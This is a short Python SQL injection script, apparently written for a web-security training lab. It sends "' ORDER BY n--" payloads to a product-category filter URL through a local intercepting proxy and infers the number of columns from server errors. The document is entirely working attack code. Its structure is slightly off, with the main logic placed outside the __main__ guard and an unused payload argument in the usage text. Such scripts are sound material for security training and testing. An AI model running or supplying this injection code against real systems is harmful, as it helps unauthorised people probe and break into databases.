import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sql_cokl_num(url):
    uri = '/filter?category=Gifts' #we use a valid category to avoid any filtering
    for i in range(1, 11):
        payload = "' ORDER BY %s--" %i #we try with 1 to 10 columns
        req = requests.get(url + uri + payload, proxies=proxies, verify=False)
        if req.status_code == 500:
            return i - 1
        i = i + 1 #increment the column count
    return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() #we take the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        sys.exit(-1)


print("[+] Figuring out the number of columns...")        

num_col = exploit_sql_cokl_num(url)
if num_col:
    print(f"[+] The number of columns is {num_col}")    
else:
     print("[-] Could not determine the number of columns")
     sys.exit(-1)